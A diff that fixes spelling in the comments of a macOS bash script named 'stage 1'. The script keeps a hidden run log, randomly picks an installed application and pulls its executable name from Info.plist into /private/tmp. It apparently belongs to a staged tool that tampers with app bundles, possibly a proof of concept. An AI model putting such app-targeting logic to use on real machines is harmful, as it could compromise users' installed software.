@@ -2,16 +2,16 @@
 #sed -E/-e fix is thanks to https://stackoverflow.com/a/28072266/
 #Stage 1, re-written:
 DEBUG=1
-#LOGGING isn't dependant anymore on DEBUG being enabled (1)
+#LOGGING isn't dependent anymore on DEBUG being enabled (1)
 LOGGING=1
-#Do not run this script in /Users/Shared/, as the logging would mess with the log
-#for removal.sh
+#Do not run this script in /Users/Shared/ with LOGGING enabled, as 
+#the logging would mess with the log for removal.sh
 Path=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 if [ ${LOGGING} == 1 ]
 then
 	if [ -f ./.stage-1.log ] && [ ${Path} != "/Users/Shared/" ]
 	then
-		#For some reason the -e (not -E) is neccesary here
+		#For some reason the -e (not -E) is necessary here
 		RC01=$(sed -ne "1s/.*\(.\)$/\1/p" ./.stage-1.log)
 		RC02=${RC01}
 		let "RC02++"
@@ -51,7 +51,7 @@ IsReadablePlist="false"
 IsAlreadyPresent="true"
 while [ ${IsReadablePlist} == "false" ] && [ ${IsAlreadyPresent} == "true" ] 
 do
-	#Application roulette; coppied from stage-1-old:
+	#Application roulette; copied from stage-1-old:
 	loc=(/Applications/*)
 	Target="${loc[RANDOM % ${#loc[@]}]}"
 	TargetPlist="${Target}/Contents/Info.plist"
@@ -113,7 +113,7 @@ do
 			echo "TmpName is ${TmpName}" >> ./.stage-1.log
 			echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
 		fi
-		#For some reason the -E (not -e) is neccesary here:
+		#For some reason the -E (not -e) is necessary here:
 		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
 		if [ ${DEBUG} == 1 ]
 		then
